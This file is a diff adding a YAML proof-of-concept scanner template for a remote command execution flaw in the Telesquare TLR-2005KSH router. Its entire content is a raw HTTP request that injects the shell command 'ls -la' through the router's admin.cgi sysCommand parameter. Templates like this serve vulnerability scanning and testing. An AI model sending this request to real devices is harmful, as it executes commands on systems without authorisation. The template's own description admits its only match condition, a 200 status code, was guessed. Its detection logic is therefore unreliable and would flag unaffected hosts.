@@ -1,0 +1,28 @@
+id: poc-aoianan8lptk0zfp
+info:
+  name: Telesquare TLR-2005KSH路由器 RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/aoianan8lptk0zfp
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: aoianan8lptk0zfp
+http:
+- raw:
+  - 'GET /cgi-bin/admin.cgi?Command=sysCommand&Cmd=ls%20-la HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.55 Connection: close
+
+    Accept: */*
+
+    Accept-Encoding: gzip'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
